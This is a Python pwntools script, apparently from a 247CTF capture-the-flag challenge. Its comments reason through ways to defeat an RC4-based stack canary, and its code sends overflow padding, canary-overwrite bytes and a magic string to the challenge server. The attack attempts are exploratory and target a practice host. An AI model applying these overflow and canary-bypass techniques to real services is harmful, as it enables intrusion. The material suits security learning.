#!/usr/bin/env python3
from pwn import *
import socket
import time

context.log_level = 'info'

# Approach: Use socket.shutdown() to send partial data
# If we send 32 bytes and then shutdown SHUT_WR, read() might return early
# preserving the canary at buffer[32:48]

# But we still need buffer[48:56] = "247CTF:)"
# This seems impossible with sequential read...

# UNLESS: The canary check comes BEFORE the flag check
# And there's some way to preserve both

# Let me try something: what if buffer already has "247CTF:)" from previous iteration?
# No, memset clears it each time.

# New idea: What if we can send data that spans multiple read() calls?
# Each user_read() does one read() call.

# Actually, let me check: if we send exactly 56 bytes where
# bytes 32-47 match the canary value, we win.
# The canary is RC4 output. Can we predict it?

# The RC4 state S evolves each iteration. If we knew the initial key,
# we could predict all canaries. But we don't.

# Wait! What if there's a way to reset the RC4 state?
# Or what if the RC4 implementation has a bug?

# Let me try: send 56 bytes with specific pattern
# Maybe there's a weakness when certain bytes are in certain positions

# Theory: The RC4 i,j reset to 0 each time. This is non-standard.
# After N calls, the S-box might have a predictable pattern.

# Let me check if there's a "weak" state after certain iterations
# where the keystream becomes predictable.

# First, let me try partial read with shutdown
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('cfea9b365e987c70.247ctf.com', 50068))

# Read banner
data = s.recv(4096)
print(data.decode())

# Send 32 bytes of padding, then close write side
# This should make read() return with 32 bytes
# buffer[32:48] = canary (preserved)
# buffer[48:56] = zeros (fail)
s.send(b'A' * 32)
s.shutdown(socket.SHUT_WR)

time.sleep(1)
try:
    data = s.recv(4096)
    print("Response:", data.decode())
except:
    pass
s.close()

print("\n--- Now trying with pwntools sendline vs send ---")

# Maybe newlines affect behavior?
p = remote('cfea9b365e987c70.247ctf.com', 50068)
p.recvuntil(b'> ')

# Try sending with specific timing
p.send(b'B' * 32)
time.sleep(0.1)  # Small delay
p.send(b'C' * 16)  # This overwrites canary
time.sleep(0.1)
p.send(b'247CTF:)')  # This sets the flag

resp = p.recvuntil(b'> ', timeout=3)
print(resp.decode())

p.close()
